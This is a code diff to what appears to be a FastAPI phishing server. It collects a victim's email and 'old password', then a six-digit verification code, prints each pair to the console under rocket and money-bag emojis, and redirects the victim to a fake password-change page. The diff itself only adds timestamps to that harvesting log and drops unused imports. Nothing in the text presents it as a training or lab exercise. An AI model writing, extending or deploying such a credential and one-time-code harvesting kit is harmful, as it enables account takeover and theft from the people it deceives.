@@ -1,13 +1,9 @@
-import os
-import json
+from datetime import datetime
 
-from fastapi import FastAPI, Form, Header, HTTPException, Request
+from fastapi import FastAPI, Form, Request
 from fastapi.responses import HTMLResponse, RedirectResponse
 from urllib.parse import urlencode
-from dotenv import load_dotenv
 
-
-load_dotenv()
 
 app = FastAPI()
 
@@ -32,8 +28,9 @@ async def reset_failed():
 @app.post("/submit-form")
 async def submit_form(email: str = Form(...), old_password: str = Form(...)):
     query_params = urlencode({"email": email, "old-password": old_password})
+    __now = datetime.now().strftime("%H:%M")
     print(
-        f"\n >>       🚀 New submission | Email: {email}, password: {old_password} \n"
+        f"\n {__now} >> 🚀 New submission | Email: {email}, password: {old_password} \n"
     )
     return RedirectResponse(url=f"/login-code?{query_params}", status_code=303)
 
@@ -62,8 +59,9 @@ async def login(
     old_password: str = Form(...),
 ):
     code = f"{num1}{num2}{num3}{num4}{num5}{num6}"
+    __now = datetime.now().strftime("%H:%M")
     print(
-        f"\n >>       💰 Verification code for {email}: {code} (password: {old_password})\n"
+        f"\n {__now} >> 💰 Verification code for {email}: {code} (password: {old_password})\n"
     )
 
     with open("change-password.html", "r") as f:
